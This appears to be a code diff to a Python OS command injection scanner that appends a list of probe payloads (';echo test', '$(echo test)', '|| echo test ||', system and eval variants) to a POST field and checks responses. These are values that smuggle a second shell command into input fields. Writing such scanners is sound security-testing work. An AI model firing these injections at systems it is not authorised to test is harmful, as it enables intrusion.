@@ -20,7 +20,7 @@ class osInjection:
         self.headers = headers
         self.data = data
         self.endpoint = endpoint
-        self.payloads =[';echo test', ';echo test #', '& echo test #', '& echo test &', '| echo test', '# echo test', '| echo test', '$(echo test)', '|| echo test', '| echo test |', '|| echo test ||', ';echo test;', '` ehoc test `', '%0a echo test %0a', ';echo test|', ';|/usr/bin/echo test|', '\\n/bin/echo test \\n', ";system('echo test')", ";system('echo test')", ";system('echo test')", "eval('echo test')", "eval('echo test');","response.write test", ":response.write test"]
+        self.payloads =[';echo test', ';echo test #', '& echo test #', '& echo test &', '| echo test', '# echo test', '| echo test', '$(echo test)', '|| echo test', '| echo test |', '|| echo test ||','; echo test ||','| echo test ||', ';echo test;', '` ehoc test `', '%0a echo test %0a', ';echo test|', ';|/usr/bin/echo test|', '\\n/bin/echo test \\n', ";system('echo test')", ";system('echo test')", ";system('echo test')", "eval('echo test')", "eval('echo test');","response.write test", ":response.write test"]
         self.PostOsInject = PostOsInject
         self.GetOsInject = osInjectGet
 
@@ -41,8 +41,9 @@ class osInjection:
     
     def checkOsInjectPost(self):
         if self.headers and self.endpoint and self.data and self.PostOsInject :
+            postInject = self.data[self.PostOsInject]
             for i in self.payloads:
-                self.data[self.PostOsInject] = i
+                self.data[self.PostOsInject] = postInject+i
                 response = self.sendPost()
                 if self.checkResponseResult(response):
                     print("OsCommand injection Found",i,"   ",self.TargetUrl)
@@ -112,6 +113,6 @@ if __name__ == "__main__":
 
 
     Test = osInjection(TargetUrl=url,headers=headers,data=PostData,endpoint=EndPoint, PostOsInject=osInjectPost, osInjectGet=osInjectGet)
-    Test.checkOsInjectGet()
+    Test.checkOsInjectPost()
 
     
